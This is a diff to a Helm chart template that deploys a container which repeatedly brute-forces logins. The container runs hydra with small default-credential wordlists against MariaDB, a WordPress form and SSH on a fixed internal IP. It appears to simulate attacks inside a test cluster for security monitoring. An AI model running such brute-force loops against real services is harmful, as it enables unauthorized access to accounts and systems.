@@ -1,5 +1,3 @@
-# Brute-force simulation deployment
-# Using alpine+shell to ensure Tetragon can capture syscalls
 {{- if .Values.bruteforce.enabled }}
 apiVersion: apps/v1
 kind: Deployment
@@ -32,63 +30,59 @@ spec:
       {{- end }}
       containers:
         - name: bruteforce
-          image: alpine:latest
+          image: {{ .Values.bruteforce.image }}
           command: ["/bin/sh", "-c"]
           args:
             - |
-              apk add --no-cache curl netcat-openbsd openssh-client > /dev/null 2>&1
-              echo "Starting brute-force simulation..."
+              echo "Starting brute-force attack simulation (throttled)..."
 
-              USERS="admin root user test guest operator"
-              PASSWORDS="password 123456 admin root letmein welcome qwerty abc123 admin123 kids_password"
+              cat > /tmp/users.txt <<EOF
+              admin
+              root
+              user
+              test
+              guest
+              EOF
+
+              cat > /tmp/passwords.txt <<EOF
+              password
+              123456
+              admin
+              root
+              letmein
+              changeme
+              EOF
 
               while true; do
                 echo "[$(date)] === Brute-force cycle start ==="
 
-                # Simulate HTTP login brute-force (Flask-Todo)
-                echo "[$(date)] Attacking Flask-Todo HTTP login..."
-                for user in $USERS; do
-                  for pass in $PASSWORDS; do
-                    curl -s -o /dev/null -X POST \
-                      http://flask-todo.benign-workloads.svc.cluster.local:5000/ \
-                      -d "username=${user}&password=${pass}" 2>/dev/null || true
-                  done
-                done
+                echo "[$(date)] Attacking MariaDB..."
+                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
+                  mariadb-sysbench-service.benign-workloads.svc.cluster.local \
+                  mysql -t 1 -w 10 -f 2>&1 || true
 
-                # Simulate WordPress brute-force
-                echo "[$(date)] Attacking WordPress login..."
-                for user in $USERS; do
-                  for pass in $PASSWORDS; do
-                    curl -s -o /dev/null -X POST \
-                      http://wordpress-app.benign-workloads.svc.cluster.local/wp-login.php \
-                      -d "log=${user}&pwd=${pass}" 2>/dev/null || true
-                  done
-                done
+                sleep 120
 
-                # Simulate SSH brute-force (connection attempts)
-                echo "[$(date)] Attacking SSH on internal nodes..."
-                for ip in 10.0.1.27 10.0.1.224 10.0.1.142; do
-                  for user in $USERS; do
-                    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
-                      -o BatchMode=yes ${user}@${ip} exit 2>/dev/null || true
-                  done
-                done
+                echo "[$(date)] Attacking WordPress..."
+                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
+                  wordpress-app.benign-workloads.svc.cluster.local \
+                  http-post-form "/:username=^USER^&password=^PASS^:Invalid" \
+                  -t 1 -w 10 -f 2>&1 || true
 
-                # Simulate MySQL brute-force via port scanning
-                echo "[$(date)] Attacking MySQL/DB ports..."
-                for ip in 10.0.1.27 10.0.1.224; do
-                  nc -zv -w 2 $ip 3306 2>/dev/null || true
-                  nc -zv -w 2 $ip 5432 2>/dev/null || true
-                done
+                sleep 120
 
-                echo "[$(date)] === Cycle complete. Sleeping 10s ==="
-                sleep 10
+                echo "[$(date)] Attacking SSH..."
+                hydra -L /tmp/users.txt -P /tmp/passwords.txt \
+                  10.0.1.27 ssh -t 1 -w 10 -f 2>&1 || true
+
+                echo "[$(date)] === Cycle complete. Sleeping 300s ==="
+                sleep 300
               done
           resources:
             requests:
               cpu: 50m
               memory: 64Mi
             limits:
-              cpu: 200m
+              cpu: 100m
               memory: 128Mi
 {{- end }}
